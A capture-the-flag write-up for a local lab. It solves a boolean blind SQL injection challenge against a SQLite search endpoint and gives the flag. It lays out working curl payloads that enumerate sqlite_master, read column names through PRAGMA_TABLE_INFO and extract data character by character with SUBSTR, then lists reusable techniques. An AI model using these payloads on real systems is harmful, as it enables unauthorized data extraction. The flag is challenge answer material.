---
title: "SQLite Boolean Blind SQL Injection"
category: web
slug: sqlite-blind-sql-injection
created: 2026-03-28
status: solved
tags:
  - blind-sqli
  - sqlite
  - boolean-based
doc_kind: writeup
---
# SQLite Boolean Blind SQL Injection

## Challenge Summary

- Source: Local CTF lab (Blind SQLi challenge)
- Target: http://localhost:5001/search?id=1
- Goal: Extract flag from hidden table via boolean blind injection

## Initial Signals

- Entry point: `/search?id=` parameter
- Visible hints: JSON API returning user data
- First confirming probe: `id=1'` triggered generic error, `AND 1=1` vs `AND 1=0` showed different responses

## Exploit Chain

1. **Confirm boolean blind injection**
   - `AND 1=1` → returns user data
   - `AND 1=0` → returns "no results found"

2. **Enumerate database structure**
   - Count tables: `(SELECT COUNT(*) FROM sqlite_master WHERE type='table')`
   - Found 3 tables: `users`, `sqlite_sequence`, `flag_storage_prv`

3. **Extract hidden table name**
   - Table name length: 16 characters
   - Name: `flag_storage_prv` (via SUBSTR() brute force)

4. **Extract column name**
   - Columns count: 2 (`id`, `flag_data`)
   - Flag column: `flag_data`

5. **Extract flag value**
   - Flag length: 41 characters
   - Flag: `CTF{blind_sql_injection_is_the_real_deal}`

## Key Evidence

- Boolean differential responses prove injectable
- SQLite system tables accessible: `sqlite_master`, `PRAGMA_TABLE_INFO()`
- Hidden table naming convention: `flag_` prefix with random suffix
- Error messages masked - forced blind approach

## Dead Ends

- Attempted UNION-based injection - blocked by query structure
- Tried direct `flag` table name - doesn't exist
- Initial character extraction missed `{` `}` - required URL encoding awareness

## Payloads And Commands

```bash
# Verify boolean blind injection
curl "http://localhost:5001/search?id=1 AND 1=1"  # returns data
curl "http://localhost:5001/search?id=1 AND 1=0"  # returns empty

# Enumerate table count
curl "http://localhost:5001/search?id=1 AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')=3"

# Extract table name length (third table)
curl "http://localhost:5001/search?id=1 AND (SELECT LENGTH(tbl_name) FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 2)=16"

# Extract table name character by character
curl "http://localhost:5001/search?id=1 AND (SELECT SUBSTR(tbl_name,1,1) FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 2)='f'"

# Get column name from PRAGMA
curl "http://localhost:5001/search?id=1 AND (SELECT name FROM PRAGMA_TABLE_INFO('flag_storage_prv') LIMIT 1 OFFSET 1)='flag_data'"

# Extract flag
curl "http://localhost:5001/search?id=1 AND (SELECT SUBSTR(flag_data,1,1) FROM flag_storage_prv LIMIT 1)='C'"
```

## Flag / Outcome

- Flag: `CTF{blind_sql_injection_is_the_real_deal}`

## Reusable Lessons

- **Boolean blind detection**: `AND 1=1` vs `AND 1=0` is the cheapest probe
- **SQLite system tables**: `sqlite_master` for schema, `PRAGMA_TABLE_INFO()` for columns
- **Character extraction**: Use SUBSTR() with position index
- **URL encoding matters**: `{` `}` need proper encoding in payloads
- **Length-first approach**: Get string length before character extraction to optimize
- **Batch extraction**: Script the brute force - 41 chars × ~40 attempts per char = ~1600 requests

## Pattern Candidates

- Existing pattern to update: Create `web-sqli-triage` skill covering:
  - Error-based vs Boolean-blind vs Time-based detection
  - SQLite/PostgreSQL/MySQL specific system tables
  - SUBSTR/LENGTH/ASCII extraction techniques
  - Automation scripts for blind extraction
